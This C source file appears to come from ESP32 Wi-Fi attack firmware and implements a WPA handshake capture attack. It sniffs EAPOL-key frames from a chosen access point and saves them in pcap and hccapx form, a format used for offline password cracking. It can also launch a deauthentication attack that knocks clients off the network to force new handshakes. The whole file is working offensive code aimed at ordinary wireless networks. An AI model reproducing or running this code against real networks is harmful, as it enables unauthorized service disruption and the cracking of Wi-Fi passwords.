#include "attack_handshake.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "frame_analyzer_parser.h"
#include "attack_deauth.h"
#include <string.h>

static handshake_method_t previous_method = METHOD_NONE;
static bool handshake_is_run = 0;

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
}

void handshake_attack_start(const wifi_ap_record_t * target, const handshake_method_t method) {
    if (handshake_is_run)
        handshake_attack_stop();
    pcap_serializer_deinit();
    pcap_serializer_init();
    hccapx_serializer_init(target->ssid, strlen((char *)target->ssid));
    wifi_sniffer_filter_frame_types(true, false, false);
    wifi_sniffer_start(target->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, target->bssid);
	ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    if (method == METHOD_DEAUTH) {
        deauth_attack_start(target, 500);
    }
    previous_method = method;
    handshake_is_run = 1;
}

void handshake_attack_stop() {
    if (!handshake_is_run)
        return;
    if (previous_method == METHOD_DEAUTH)
        deauth_attack_stop();
    wifi_sniffer_stop();
    frame_analyzer_capture_stop();
	ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler));
    handshake_is_run = 0;
}